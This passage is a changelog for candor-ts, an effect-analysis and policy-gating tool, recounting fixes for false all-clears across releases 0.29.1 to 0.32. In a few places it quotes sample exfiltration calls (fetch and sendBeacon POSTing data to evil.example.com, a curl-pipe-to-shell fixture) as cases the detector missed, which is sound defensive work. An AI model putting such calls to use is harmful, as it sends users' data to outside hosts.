  BOTH BUNDLE — so this was the shipped editor experience, on the surface with the fewest ways to notice
  it. MEASURED over one report (a `dist/shipped.js` running `curl … | sh` that the no-policy scan never
  opened) and one discovered `deny Exec`:

  ```
  CLI  gate --report      exit 2, names the unread class
  MCP  candor_gate        {ok:false, incomplete:true, unread:[…]}
  LSP                     publishes [] — no diagnostic, no logMessage, no showMessage
  ```

  A control run with an IN-SCOPE `execSync` squiggles correctly, so the silence was specific to the
  unread-code cause and not a broken fixture. The file argued against itself: four lines above the code
  that returns `[]`, its ⟨0.24⟩ judged-nothing hedge says *"an empty editor reads as 'the gate is
  green'"*.

  ALL THREE INCOMPLETENESS CAUSES, not just the one this rung is named for — measurement showed the
  route equally silent on ⟨0.21⟩ `unanalyzed` and ⟨0.30⟩ `outOfScope`, which are one `gincomplete`
  disjunction on the CLI gate and one `incomplete` on the MCP tool. Carrying one of three would have
  left the same defect in the same function for the next audit to find. The condition is read off the
  same `reportCompleteness` value every other route reads and applied once: `unread` gated on
  `pol.deny.length` (`pure` rides that vector, so a `pure`-only policy still arms it), the other two
  unconditional, each cause NAMED ONLY WHEN IT FIRED.

  THE CHANNEL, argued rather than assumed. This surface has no exit code and no verdict document, so the
  rung collapses onto messages. `window/logMessage` carries the detail and the repair, as every other
  hedge in the file does. A `window/showMessage` rides WITH it because ⟨0.32⟩ is EXIT-BEARING on all
  four other routes, where ⟨0.24⟩'s judged-nothing hedge deliberately is not (`gate --report` exits 0
  over a judged-nothing report) — putting the louder cause on the quieter channel would invert an
  ordering the rest of the package agrees on. **No diagnostic is drawn**: there is no source range for a
  file the scan never opened, so the only line available is line 0 of whatever document happens to be
  open, and a squiggle there would attribute the hole to an innocent file, in every mapped language, on
  every open. Both messages are `warnOnce`-deduped on a text that is a function of the policy and the
  report, not of the edit.

- **⟨0.30⟩/⟨0.32⟩ …and a SIXTH: the MCP `candor_unverified` tool answered `{ok:true, unverified:[]}`
  where `candor_gate` IN THE SAME PROCESS answered `incomplete`.** Found by sweeping the route inventory
  rather than assuming it. ⟨0.32⟩ carried both scope causes into the CLI's `unverified`/`fix-gate` and
  into the MCP `candor_gate`, and left this tool on the ⟨0.24⟩ four-argument `advisoryAnswer` call — the
  sibling-route habit inside a single file. Over the same bytes the CLI sibling `unverified --strict`
  omitted `ok`, named `unread` and exited 2. ⟨0.24⟩'s MUST is unchanged and binds every channel a verb
  answers on: an advisory verb may be LESS certain than the gate, NEVER MORE.

- **⚠ ⟨0.32⟩ The unread-code rule reached only the SCAN route — `gate --report` certified code nobody
  had opened.** ⟨0.32⟩'s central rule is that a class this scan did not READ makes the verdict
  INCOMPLETE. It shipped in `scan.mjs` and nowhere else, so the shape this tool is actually deployed in —
  scan in CI, gate the artifact later — kept answering green. MEASURED at `396d6f4`, one tree whose
  excluded `dist/shipped.js` runs `execSync`:

  ```
  candor-ts <tree> --policy 'deny Exec'                  exit 2, names the excluded fn's Exec
  candor-ts <tree> --out N                                 (no policy)
  query.mjs gate --report N --policy 'deny Exec'         exit 0, ok: true, NO disclosure
  ```

  THE RULE, now stated once and applied on every route: a class the producing scan did not READ licenses
  nothing, and whether that matters is decided by the policy applied NOW, not by the producer's history.
  `peeked: false` has two causes — *opened it and failed* and *never asked* — and from a report they are
  indistinguishable, because they leave the identical hole: those files' effects are absent from
  `functions` because nothing looked, and ⟨0.21⟩ licenses a purity claim only over units the scan judged.
  The carve-out is about the QUESTION (only a `deny`/`pure` rule's answer depends on code outside the
  scan's scope), and it is applied ONCE to the value, never at the exit arm — the same list feeds
  `incomplete`/`ok` in the document and the exit code, and a condition on one of them lets the two
  disagree. `excluded` joins the strictly-read §2 keys: present-but-unparseable is a refusal NAMING the
  key, never coerced to "this scan excluded nothing" (and `"peeked": "no"` is TRUTHY in this language, so
  an unchecked read turns an unread class into a peeked one).

  FOUND BESIDE IT, three more routes with the same hole. (a) The scan route keyed `unreadClasses` on
  *the peek SUCCEEDED* rather than *the peek was ASKED FOR*: export a `CANDOR_POLICY` naming a file that
  does not exist and the peek child — which inherits the environment — dies on its own unreadable-policy
  refusal, every class publishes `peeked: false`, and the scan said `policy ✓` at exit 0 over code
  nothing had opened. (b) The MCP `candor_gate` tool carried NEITHER the ⟨0.30⟩ `outOfScope` cause nor
  this one, so the agent channel answered `{ok: true, violations: []}` where the CLI exits 2; it now
  names which of the three causes fired. (c) `fix-gate --strict` and `unverified --strict` printed
  `{"ok": true, …: []}` **at exit 2** over a report carrying `outOfScope` — the exit had obeyed §3.2's
  *never MORE certain than the gate* since ⟨0.30⟩ and the document never did.

  MEASURED, 363 real packages × `deny Exec`/`Net`/`Fs` = 1,089 pairs, both routes, before and after
  (26 before-rows are excluded: their gate process died under the harness's own load and left an
  arm-stamp document, which is contamination, not a verdict):

  · **564 of 1,063 pairs newly refuse** — 206 of 363 packages — because gating a report produced
    WITHOUT a policy now fails closed on any tree with a test file, a `.d.ts` or a `dist/`. That is the
    rung, not a side effect: the repair is one flag and the message names it. Hand-checked
    (`json-schema-traverse`, `fast-json-stable-stringify`, `word-wrap`): every newly-named class is real
    files the no-policy scan never opened, and re-scanning WITH the policy flips it to `peeked: true` and
    a definite answer.
  · **0 newly refusing on the policy-produced report** — the route whose producer WAS asked is unmoved.
  · **0 byte-equality failures** before or after: the scan's `--gate-json` and `gate --report`'s over the
    same report stay byte-equal on all 1,089.
  · **0 over-charges** (refusing with nothing unread) and **0 under-reports** (exit 0 with an unread
    class named in the report). **0 violations lost**: all 86 scan-route exit-1 pairs still exit 1, and a
    real violation still dominates INCOMPLETE.
  · The scan route's exit distribution is IDENTICAL before and after (959/86/44) — the peek-was-asked
    predicate costs nothing on a corpus where no peek dies.

- **⚠ ⟨0.32⟩ A node-core member this engine has not reviewed is `Unknown`, never pure — and a
  constructor is attributed to the class you wrote, not to the base it inherits from.** Two silent false
  all-clears, one classifier surface.

  MEASURED, `deny Fs`, with a control in the same file: `readIt(p) { return new fs.ReadStream(p); }` was
  **absent from `functions` entirely** — under SPEC §2 rule 3 a positive purity claim — with no
  `Unknown`, at exit 0 and `ok: true`, while the sibling `fs.readFileSync(p)` reported `Fs` correctly.
  `analyzed: 3`, so the file was read and the unit was minted; the engine looked at a filesystem open and
  said nothing. The mechanism is not the one the symptom suggests: κ's `fs` rule is WHOLE-MODULE and
  would have charged `Fs` for any member including the synthesized `new`, but `fs.ReadStream` declares no
  constructor of its own, so `getResolvedSignature()` resolved to `stream.Readable`'s constructor in
  `stream.d.ts` and the module was read off the base's file. `new http.ClientRequest(o)` was `Net`
  correctly for the mirror-image reason — `ClientRequest` DOES declare its own constructor — so the vein
  was inconsistent rather than absent, which is why hand-written fixtures never produced it. The class
  now comes from the `new` expression, and κ is re-keyed onto the class's own module when the
  constructor's module answered nothing (a hole-filler; it never overrides a rule that fired).

  The second half is the posture underneath it, written at the coverage-ledger site as "an unlisted
  builtin (path, util) is known-pure, not blind". True of `path` and `util`; false of
  `v8.writeHeapSnapshot()` (writes a heap dump), `inspector.open()` (binds a port), `process.dlopen()`
  (loads native code), `process.chdir()`, `repl.start()` and `new worker_threads.Worker(file)` — all six
  silent-pure. A limitation written as a comment reads as considered, which is what kept it unmeasured.
  Node core is finite, so the floor is a **denylist**: every builtin's export surface is reviewed
  (`NODE_CORE_REVIEWED`), and a member neither classified by κ nor named there is
  `Unknown[native:<module>.<member>]`. Forgetting an entry now over-charges instead of under-reporting,
  and an API node adds next year fails closed. Newly modelled on the way through:
  `v8.writeHeapSnapshot`/`takeCoverage`/`stopCoverage` → `Fs`, `inspector.open` → `Net`,
  `process.loadEnvFile`/`process.report.writeReport` → `Fs`, `process.getuid`/`getgid`/… → `Env` (the
  `os.userInfo` precedent), `os.networkInterfaces` → `Env`, `util.debuglog`/`debug` → `Env` (they read
  `$NODE_DEBUG`), `module.enableCompileCache`/`flushCompileCache`/`getCompileCacheDir` → `Fs`.

  **The controls are the deliverable**, because "unmodelled ⇒ Unknown" is trivially achievable by making
  everything Unknown, and re-keying `new` is trivially achievable by charging every construction. Pinned
  PURE in the same test block: `path.join`, `path.resolve`, `os.platform`, `crypto.createHash().digest()`,
  `util.format`, `util.inspect`, `zlib.gzipSync`, `new EventEmitter()`, `new stream.PassThrough()`,
  `new URL()`, `Buffer.from`, `JSON.stringify`, `process.cwd()`, `process.memoryUsage()`,
  `new http.Agent()`, `new net.Server()`, `net.isIP()`, and a USER-DEFINED `class ReadStream` that does
  nothing. Three of the entries were earned rather than guessed: the corpus round found the floor
  re-charging `process.stdout.write`/`process.stdin.on` as `Unknown[native:net.write]` — the fabricated
  `Net` the std-stream carve-out exists to remove, reintroduced under another name by a fix in the other
  direction — so a classifier that DECIDED a call is pure is now distinguished from one that failed to
  answer; it charged 410 ordinary CJS `require()` calls across 51 of 85 packages, an `Unknown` over
  evidence the engine holds; and the SELF-GATE caught `process.kill(process.pid, sig)` in this repo's own
  `scratch.mjs` coming back as `Exec`, which would make `deny Exec` mean something other than "can this
  run a program". `kill`, `chdir` and `umask` are therefore in neither list and land on the honest floor.

  CORPUS REGRESSION, 85 real packages × `deny Fs`/`Net`/`Exec`/`Unknown` = 340 pairs, before and after:
  **1 exit-code flip** (`@humanfs/node`, `deny Unknown` 0 → 2, and that is the census fix below, not this
  one), Unknown-bearing functions **3324 → 3324** — no flood — and exactly **two** new `native:` findings,
  both hand-verified true positives: eslint's `workerExecutor` really does `new Worker(workerURL)`, and
  cross-spawn's `resolveCommandAttempt` really does `process.chdir(parsed.options.cwd)`. isexe gained
  `Env` on three functions because `checkMode` calls `process.getuid()`. Scan wall-clock +6.6%.

- **⚠ ⟨0.32⟩ The `excluded` census walks what the analysis walk walks — `dist/`, `build/`, `out/`,
  `coverage/` and dot-directories are no longer invisible.** MEASURED on byte-identical code under one
  policy (`deny Exec`), differing only in the directory name:

  ```
  lib/shipped.js   → exit 2, excluded: [{class: "outside-the-tsconfig-program", count: 1}],
                     outOfScope: [{fn: "run", effects: ["Exec"]}]
  dist/shipped.js  → exit 0, policy ✓, excluded: []
  ```

  The ⟨0.29⟩ census carried its own skip list that nothing upstream shares, so the two halves of one
  report disagreed about which files exist. `excluded: []` is not silence — ⟨0.27⟩ makes zero-match a
  positive statement and ⟨0.30⟩/⟨0.32⟩ build the INCOMPLETE verdict on top of it — so a census that
  under-reports does not omit a note, it disarms the rung that consumes it. 121 of 744 packages in a
  corpus draw ship their only readable source under such a directory, and it fires on this project's own
  VS Code extension: `dist/extension.cjs` carries `child_process`, and the scan now names two findings in
  it that it previously did not count at all. `node_modules` and `.git` still skip, which is AGREEMENT
  rather than an exception — the analysis walk skips `node_modules` too, via `isTestPath`.

  A `dist/` that is the build output of an already-analysed `src/` is DISCLOSED, deliberately: candor has
  no build provenance, so nothing proves the built file is the compiled image of the source rather than a
  stale artifact or a bundle that pulled in an extra import, and the shipped artifact is what runs at
  install and import time. It does not double-count (`analyzed.count` is the units this scan JUDGED, and
  is byte-identical with and without the directory) and it does not refuse spuriously (a REAL violation
  in `src/` still exits 1 naming the function — certain beats unevaluable). Both are pinned as controls.

- **⚠ ⟨0.32⟩ A sibling report can no longer answer for another member (SPEC §2.2).** `gate --report` over
  one member of a multi-report prefix REFUSED a class-scoped `deny` at exit 2, and gating that same member
  beside an unrelated sibling exited 0 with `policy ✓` — a false green produced by ADDING a report. §2.2
  has always required a consumer to join by `hash` and never by bare `fn` ("names may legitimately repeat
  across packages"); this engine joined by `fn`, so two distinct functions sharing a name merged into one
  unit and the unanswerable `Unknown` of one borrowed the other's reason class. Union is safe for EFFECTS
  and unsafe for REASONS: adding an effect can only add violations, while adding a reason turns "I cannot
  say" into "I checked, it's fine".

  The merge now keys by `hash` REFINED BY `fn` rather than by `hash` alone, because this engine's hash is
  `<package>#<local tail>` and is not unique — on hono's sources 13 hashes are shared by two or more
  distinct `fn`s — so bare-`hash` keying would have reopened the same borrowing inside a single report.
  Call EDGES resolve through the same identity: a callee resolves against its own package first, then
  against a unique declarer, and an AMBIGUOUS name contributes `Unknown[dispatch]` at the caller rather
  than vanishing (dropping it silently is a second route to the same false green). Policy scopes and the
  verdict's `fn` remain the NAME, so `scan --policy` / `gate --report` byte-equality is unchanged.

  Ordinary verdicts do not move: zod, hono, got and execa gate byte-identically before and after across
  gate, `--gate-json`, `unverified`, `--class` and `fix-gate`. On a multi-report prefix the violation set
  is identical and the only change is ten rows losing a `setup` reason class they had borrowed from
  another package's same-named module.

- **⟨0.32⟩ A refusal records itself beside the reports it would have written.** A run given no `--out`
  writes to its default prefix, and a refusal left whatever the last successful run put there readable as
  current — `gate --report <tree>` answering `policy ✓` at exit 0 off the previous run's bytes. The
  refusal now writes `<prefix>.refused.json`, which overwrites nothing; `gate --report` consults it and
  declines to certify; a completing run removes it.

  Written during argv parsing, the earliest moment the prefix is known — which is the whole reason a
  marker beats arming the prefix, since arming that early is the measured data loss (this engine's own
  first ⟨0.28⟩ armer left candor-rust's committed report dirty). The first version of this port latched
  the prefix downstream and produced no marker on exactly the argv-death case it exists for.

  `.refused.json` joins the reserved segment set: `isReport` discriminates by name, so without it a
  prefix whose only sibling was a marker passed the existence check and loaded zero functions — the
  authoritative-empty silent under-report that predicate exists to prevent.

## [0.31.0] — 2026-08-20

- **⚠ A single-file target of a kind this engine cannot read was certified GREEN.** `candor-ts notes.txt
  --policy p` printed `policy ✓` and exited 0 with `ok: true` over a file it never parsed — the compiler
  dropped it silently and the "no sources" predicate never fired, because the name was in the list. rust,
  java and swift all refuse the same input. That is the §3.3 ⟨0.31⟩ unevaluable-target cause answered
  green by the release that introduces it: a typo'd path in CI that happens to name a file was a
  permanent pass. The single-file branch now applies the same admission rule as the directory walk, which
  is where that rule already lived.

- **An excluded file this engine cannot READ no longer claims to have been peeked.** With a policy
  denying `Fs`, a readable excluded file exits 2 and names the function; `chmod 000` on that one file and
  the same tree exited 0 with `peeked: true` and an empty `outOfScope` — byte-identical to a clean peek,
  with readability the only difference. The child's TypeScript program drops an unreadable file with no
  diagnostic, so the existing accounting never saw it. The parent now checks the premise it is in a
  position to check, and the class withdraws its completeness claim, which is what candor-rust already
  answered on the same shape.

- **`outOfScope` locators: the third copy of the lookup, and the reason suffix-matching was wrong.** A
  previous entry said two copies became one; there were three, and the survivor drove class attribution
  for `peeked` — worse in kind than a mislabelled locator. All three now share one resolver, and it
  RESOLVES rather than matches: the peek child reports locations relative to its own temp root, so they
  are resolved against that root and relativised back to the scan root. Suffix-matching was defeated by a
  project directory named `app` holding both `x.test.ts` and `app/x.test.ts` — the root file's absolute
  path genuinely ends with the nested file's relative path, on a segment boundary, and is the longer
  match. Suffix and basename survive only as fallbacks, the basename one only when unambiguous.

- **A refusal writes its reason to a `--gate-json` FILE sink.** Only stream sinks got it, so a run
  refusing with `--gate-json g.json` left the arming stub — "the run failed, crashed or was killed" —
  describing a deliberate refusal as a crash. It replaces only a document this run itself armed: writing
  to the sink path directly bypassed ⟨0.28⟩'s guard that arming must never destroy the source it is
  about to scan, which six ⟨0.28⟩ rows caught. Refusals now also name a remedy, per §3.3(d).

- **⚠ `outOfScope` named the wrong file when two excluded files shared a basename.** MEASURED with
  `src/one/dup.test.ts` and `src/two/dup.test.ts`: `fn_two` was disclosed at `src/one/dup.test.ts`. The
  lookup read `find(e => loc.endsWith(e.path) || loc.endsWith(basename(e.path)))` — the `||` inside a
  single `.find`, so a basename match on an earlier entry beat a full-path match on a later one.

  Nothing was hidden: both functions were reported, with the right effects and class. But the report
  asserted a function was in a file it is not in, and an operator following that locator lands on a
  different function or on nothing. candor-rust and candor-swift both name each function's own file here;
  candor-java's locator is the jar, with the qualified name disambiguating.

  Two passes now, and the order is the point: a full relative-path suffix match across every entry first
  (longest wins), then the basename, and only when it names exactly one excluded file. If it is still
  ambiguous the lookup returns nothing and the child's own absolute path is reported instead — an
  ugly-but-true locator is a better answer than a tidy false one, and the basename fallback exists only
  because the peek's child scan runs under a temp-directory tsconfig. The two copies of this lookup are
  now one.

  Same-basename files are not a corner case: `index.ts`, `mod.ts` and `i.test.ts` repeat in every
  monorepo, which is where this was found.

- **A refusal produces no report — fixing a document/exit disagreement introduced by the entry below.**
  The no-sources fix let the clean case fall through to a normal ending and exit 2 from an arm *after* the
  verdict was written: the process exited 2 while `--gate-json` said `ok: true`, and `gate --report` over
  the report it left behind answered 0. Exit code right, document green, and a machine consumer reads the
  document. §3.1's byte-equality is quantified over *"any report a scan produced"*, so the only safe
  refusal is one that produces no report at all — once an envelope exists the scan route owns the gate
  route's answer over it. The refusal now happens straight after the peek, before any envelope: a peek
  that names something reports it (`ok:false, incomplete:true`, and `gate --report` reaches the same 2), a
  peek that names nothing refuses (`ok:false, refused:true`, no report). Found by two independent
  reviewers on the published-artifact review, and pinned four-way by conformance PART 56.

- **⟨0.31⟩ `netPartners` — the ambient config that moved a verdict is named in it.** MEASURED: under
  `deny Net[unknown-host]`, a call to `partner.example` exits **1**; adding `net-partner partner.example`
  to `.candor/config` exits **0** with `ok: true` — and nothing in the verdict named the file, its path,
  or the host. An operator reading that green could not tell an ambient file turned a red into it. That is
  the failure §3.1's `policyVocabulary` already refuses for `unknown-alias`, whose argument reaches this
  key and whose MUST did not.

  The report now carries `netPartners: { config, hosts }` — which config declared partners, and which of
  them actually **participated**. The verdict carries the list of those records on **both** routes.

  Three things the reverted first attempt got wrong, each closed structurally rather than by care:
  *anchoring* — it is self-contained, never folded into `policyVocabulary`, because that anchors at the
  policy file's directory while `net-partner` anchors at the target and one key naming one source would
  be lying about two; *normalisation* — `partnerFor` is now the single matcher and `netDestClass` calls
  it, so the disclosure asks the same function the decision asks (the first attempt re-matched, and
  `partner.example:443` never equalled `partner.example`, so it came back silently empty on every real
  run); *§3.1 byte-equality* — the provenance lives in the REPORT, so `gate --report`, which has no target
  to anchor at, copies the producer's record verbatim instead of recomputing. Both routes read one source
  and agree by construction. Verified byte-equal.

  Additive: a project declaring no partners, or declaring one that never matched, is byte-identical to a
  pre-rung report — a declaration that changed nothing is not provenance.

- **⚠ R54 — an fd/stream write reached through a helper is no longer charged `Net`.** `process.stdout` is
  typed `tty.WriteStream`, which EXTENDS `net.Socket`, so `.write` resolved into the net cluster's typings
  and the whole-module Net rule painted it. The carve-out matched the receiver's TEXT
  (`process.stdout.…`), so one level of indirection defeated it:

      const pick = fd => (fd === 1 ? process.stdout : createWriteStream("", {fd}));
      pick(3).write("hello");        // was: Net, netClass unknown-host. There is no socket.

  Measured on execa in the ⟨0.30⟩ blast-radius sweep: **six test fixtures charged `performs Net`** — 2 of
  the 31 verdict flips, and the only two of that sweep that were not genuine. execa performs no network;
  A/B on its real source goes from exit 2 to `policy ✓`.

  The decision is now made from the receiver's TYPE, as a **denylist**: `Net` is suppressed only when
  EVERY constituent is a proven non-network stream class (`tty`/`fs` `WriteStream`/`ReadStream`, declared
  in @types/node's own typings). An unknown constituent, an `any`, a project class of the same name, or a
  real `net.Socket` all KEEP the charge — the failure direction is an over-report, never a false
  all-clear. `stream.Writable`/`Readable` are deliberately EXCLUDED: a real `net.Socket` IS a
  `stream.Duplex` and satisfies them. Scoped to `Net` alone, so the `Fs` an `fs.WriteStream` legitimately
  carries is untouched. Six regression cases, three of them under-report controls written before the fix.

- **`publish.yml` no longer re-runs the full battery over bytes ci.yml just tested.** `release.sh`
  cannot tag until release-preflight `[10]` sees CI green on HEAD, so by the time the tag fires, ci.yml
  has already run `npm test` on that exact SHA — and more besides. Repeating it cost **12 minutes on the
  0.30.0 cut**, and that sat on the release's critical path: the cross-repo pin bump cannot be pushed
  until npm carries the package, because the pins start the IDE jobs that install it. The battery is now
  skipped only when a SUCCESSFUL ci.yml run exists for the same commit — no run, a failed run, an API
  hiccup or a `workflow_dispatch` on an untested commit all run it. The guard can only ever cost a
  duplicate run, never a skipped one.

## [0.30.0] — 2026-08-19

- **Two published bins crashed on startup, and had since 0.29.0.** `candor-ts-sensitivity` and
  `candor-ts-transitive-recall` are declared bins and were in the published `files`, but the
  `scratch.mjs` they both import was NOT — so `npm i -g candor-ts` installed two commands that died
  with `ERR_MODULE_NOT_FOUND`. Verified by executing every declared bin out of a real `npm pack`
  tarball with dependencies installed; all eight now run. Found in a pre-publish audit, one release
  after the import landed.

- **Spec floor 0.30.** The declaration this build emits as `candor.spec` moves with the family; see
  candor-spec's changelog for the rung.

### ⚠ ⟨0.30⟩ VERDICT-AFFECTING — a gate that was GREEN can now exit 2

**What changed.** When a policy is configured, candor "peeks": it reads the files the scan itself
excluded (test files, build scripts, archives under the root, files outside the build's program) and
reports any that perform an effect the policy DENIES. Until now that block was disclosure only — ⟨0.29⟩
required the exit code to stay exactly what it would have been without it. **It no longer does.** A
non-empty `outOfScope` now makes the verdict `ok: false`, `incomplete: true`, **exit 2**.

**Why.** The ⟨0.29⟩ rule assumed the peek surfaces UNCERTAINTY, which a gate may reasonably decline to
act on. Measured on published 0.29.1, it does not: it resolves a CONCRETE denied effect and names the
function. Under `deny Net`, `axios` had **37 functions the engine had concluded perform Net** — printed,
per function — and still exited 0 with `policy ✓`. (`axios` ships 5 real `.ts` files, every one a type
test, against 160 `.js` implementation files.) Also measured: `node-fetch` 15, `ky` 9, `execa` 9, `zx` 3,
`ofetch` 1. An engine that concludes a function performs the denied effect, prints that conclusion, and
then certifies the tree is committing the cardinal sin holding its own evidence.

**Exit 2, not exit 1.** These functions are never reported as `violations` and never appear in
`functions`: the gate did not JUDGE them, so claiming a violation would be false in the other direction.
Exit 2 says *I could not see enough of this tree to answer*, reusing the `{ok:false, incomplete:true}`
vocabulary ⟨0.21⟩ already defines. A real violation (exit 1) still dominates.

**What does NOT change.** The block is bounded to effects your policy DENIES, so the trigger is never
"you excluded something" but "you excluded something that does the thing you forbade". Across 27 real
packages this flips 6 and leaves 14 green — every one of those with an empty peek, because the scan read
them in full. **Measured more broadly since:** across 37 real projects and 4 realistic policies
(`deny Net`/`Exec`/`Fs`, `pure`), **16 flip at least one gate**; of 96 gates green under 0.29.1, **31 now
exit 2**. Verified by reading the named code, **29 of those 31 are genuine** — serde's `build.rs` running
`rustc`, clap's completion tests spawning shells, alamofire launching `/usr/bin/leaks`, axios's 160 unread
`.js` files. **Jar and class-directory targets are unaffected**: java flipped 0 of 14, because there is
nothing under such a root to peek. A present-and-empty `outOfScope` stays exit 0. A report produced with NO policy has no
`outOfScope` key at all, and gating it stays exit 0, so pre-⟨0.30⟩ reports are unaffected on contact.

**If this turns your gate red.** Read the `⚠` lines: each names a function, its file, and the effect.
The verdict document carries the same list under `outOfScope` for machine consumers. Then one of:

- **Bring the files into the scan** so the gate judges them properly — `--include-tests` (rust) or
  `--allow-js` (ts). Expect the truth rather than a pass: axios under `--allow-js` exits 1 with 27
  genuine violations. **There is no flag for every class**: nothing brings a rust `build.rs`, a swift
  harness target, or a **ts test file** into scope — candor-ts filters test paths unconditionally and
  has no `--include-tests` — so those need one of the options below.
- **Scope the rule** so it does not reach the excluded code (`deny Exec src`) — measured working on rust
  and swift for exactly the build-script and test-target cases above.
- **Address the effect**, which is the point of the gate.

**There is no opt-out.** No flag, environment variable or config key restores the ⟨0.29⟩ behaviour. The
rung is a decision about what a green gate means, and a halfway setting would be a second meaning. If you
are not ready, the escape is the engine pin — do not upgrade yet.

**A known over-charge, stated rather than discovered.** A write to a stream or file descriptor reached
through a helper can be charged `Net`, because `tty.WriteStream` extends `net.Socket`. It accounts for 2
of the 31 measured flips (execa under `deny Net`). It predates this rung — ⟨0.30⟩ only makes it
verdict-bearing — and it is a classifier fix with its own risk, so it is being made separately rather
than folded into a release.

**The finding states what candor CONCLUDED, not what is true.** The reason string reads *"candor's
analysis reaches this effect"*, not *"the effect is real"*. For 29 of the 31 measured flips the stronger
wording would have been accurate; for the 2 above it would not, and this family rates a FALSE disclosure
worse than a missing one. A finding that asserts ground truth makes a claim the analysis cannot support.
No verdict changes, and the `did NOT judge` phrase PART 48 pins is untouched.

### Fixed — found by an adversarial review of the rung above, before release

- **A corrupt `outOfScope` key failed OPEN.** A present-but-malformed key was coerced to nothing, so
  `gate --report` answered exit 0 / `ok: true` over a report whose peek had resolved a denied effect —
  the exact fail-open coercion the strict read exists to prevent. It now refuses (exit 2), naming the key.
- **The peek used the GATE'S OWN matcher.** It had flattened the policy into a set of effect NAMES,
  which discards `Net[known-partner]`-style destination classes and rule scopes, and reads `pure` — a
  deny rule with an empty effect list meaning *every effect except Unknown* — as denying NOTHING. So the
  strictest policy silently disarmed the rung (exit 0 where `deny Exec` exits 2 on the same tree), while
  a class-filtered rule fired on hosts it does not deny. Both directions are gone.
- **`unverified --strict` and `fix-gate --strict` follow the gate.** They answered clean at exit 0 over a
  report `gate --report` refuses at 2, which breaks the standing rule that an advisory verb must never be
  less sensitive to incompleteness than the gate over the same bytes.
- **The finding text no longer contradicts the verdict** — it said "the verdict does not account for it"
  directly above the line saying the verdict is incomplete because of it.

## [0.29.1] — 2026-08-18

- **⚠ VERDICT-AFFECTING, AND IT FLIPS A PINNED ROW: module resolution is `Fs`.** `require.resolve(m)`,
  `createRequire(u).resolve(m)` and `import.meta.resolve(m)` read PURE. They walk directories, read
  `package.json` files, and throw MODULE_NOT_FOUND based on what is on disk — the answer is a function
  of the filesystem. The existing row asserted purity on the rationale *"returns a path, loads
  nothing"*, which answers whether it EXECUTES arbitrary code (it does not, which is why it stays out of
  `Unknown` unlike `require(m)` beside it) and not whether it READS. The row is updated with that
  distinction spelled out. The surface is marked `incomplete: Fs` and never publishes a `paths` literal:
  the argument is a module SPECIFIER, so publishing it as a path would fabricate a location, and the
  files actually touched are a directory walk nobody wrote down. **A `deny Fs` gate over a build tool
  that resolves modules will now fire** — breadth measured first: 2 of 34 cloned TS packages call these
  at all. `path.resolve` and `Promise.resolve` are pinned pure; the rule is the module system, not the
  name. Found by a new MONOTONICITY oracle (below).

- **⚠ CARDINAL SIN — `fetch` reached through an IMPORT was treated as the project's own.** The shadow
  guard asks "is this `fetch` declared in a project file?", and for `import { fetch } from
  "node-fetch-native/proxy"` the declaration is the IMPORT SPECIFIER — which lives in the importing
  file, a project file. So the guard said yes and withheld Net, and `deny Net` certified
  `await fetch("https://evil.example.com/collect", { method: "POST", body: data })`.
  **The shape is a MONOTONICITY VIOLATION**: without `node_modules` the call reported `Unknown`
  (honest — the import did not resolve); INSTALLING the dependency turned it into nothing. More
  information, less safe answer. FOUND ON REAL CODE: giget's `_utils.download` — a function whose whole
  job is an HTTP download — reported `['Fs']` alone with its 474 packages installed, and now reports Net
  across all 7 functions on that path.
  The guard now keys on the MODULE SPECIFIER, not file-set membership: a relative import is the
  project's own module by definition, a bare specifier is somebody else's `fetch`. That reworking was
  itself forced by a CONTROL — keyed on `projectFiles`, scanning a single FILE left a sibling `./mock`
  outside the analyzed set and a project's own mock fabricated Net. The specifier is what κ already
  classifies on, and it does not move with the scan's shape.

- **`worker_threads.postMessageToThread` is Ipc.** Node 22's module-level send read PURE while every
  other spelling of the same channel was charged — `parentPort.postMessage`, `worker.postMessage`, a
  `MessagePort`'s `.postMessage`, `receiveMessageOnPort`. The κ name pattern was anchored, so the newer
  API slipped past a rule that already covered the concept. Found by ENUMERATING each builtin's exports
  and diffing them against what the table charges: 92/92 for `node:fs`, and the uncharged entries
  elsewhere are all deliberate and documented (`net.isIP` is a pure string validator, `dns.getServers`
  is in-process config, zlib's 28 exports are in-memory transforms).

- **`os.tmpdir()` / `os.homedir()` are Env** — this list charged `os.hostname()` and `os.userInfo()` as
  environment reads and left these two pure, so the engine was inconsistent with ITSELF. They are not
  the "inert host introspection" the carve-out is for: node resolves `homedir()` from `$HOME` and
  `tmpdir()` from `$TMPDIR`/`$TMP`/`$TEMP` — environment-variable reads behind a convenience name.
  `deny Env` answered exit 0 over `os.homedir()`. candor-rust charges the identical operations
  (`std::env::temp_dir`, `env::var("HOME")`, `env::current_dir`), so ts was the outlier. Found by a
  cross-engine PARITY SWEEP — the same operation written in each language, compared. `platform`/`arch`/
  `cpus` are untouched and pinned by the carve-out rows: they read no variable.

- **The alias unwrap's own BOUND was failing open, and that was my fix's defect not the engine's.** It
  stopped at 4 hops and returned the same result whether the CHAIN had ended or the BUDGET had, so a
  five-deep alias read PURE while a four-deep one read Net — a silent cliff introduced by the fix for a
  silent cliff. Exhausting the budget now charges `Unknown` (the posture this engine already takes for a
  callee it cannot resolve), and the budget is 16 rather than 4: a bound exists to stop pathological
  input, not to decide real code, and at 4 it would also have charged Unknown over an ordinary chain of
  renamed PURE helpers. Both rows pinned — a six-deep chain to `fetch` is Net, a six-deep chain of pure
  helpers stays pure.

- **⚠ The WEB CLIPBOARD was unmodelled — a §6.1 boundary effect the family had rolled out everywhere
  else.** `navigator.clipboard.writeText/readText/write/read` read PURE, so `deny Clipboard` answered
  exit 0 over `await navigator.clipboard.writeText(secret)` — and over `readText()` in the other
  direction, which is data arriving from outside the program. candor-swift charges `NSPasteboard` both
  ways and candor-rust charges `arboard`; `clipboardy` was never affected because an import resolves
  through κ. Found by sweeping EVERY effect-bearing global, not the one that prompted the sweep.

- **⚠ Two effect-globals were missing outright, found by sweeping the ALIAS spelling across all of
  them.** `navigator.sendBeacon(url, data)` — the analytics exfiltration primitive, which exists to POST
  data to a server on unload — was charged NOTHING, so `deny Net` answered exit 0 over
  `navigator.sendBeacon("https://evil.example.com/collect", data)`. It is Net now, with host capture from
  argument 0 and `incomplete: Net` on a runtime URL, matching the `xhr.open` and ctor branches. And
  `crypto.getRandomValues` / `randomUUID` are Rand: node's imported `randomBytes` was always charged,
  while the browser global resolved to lib.dom and was charged nothing. The alias question was the one
  asked; the direct call being silent was the answer.

- **The `new` path shared the alias defect** — `const W = WebSocket; new W(url)` matched a ctor named
  "W". The first cut of the alias fix covered CALLS only, so this was that fix's own sibling. Both paths
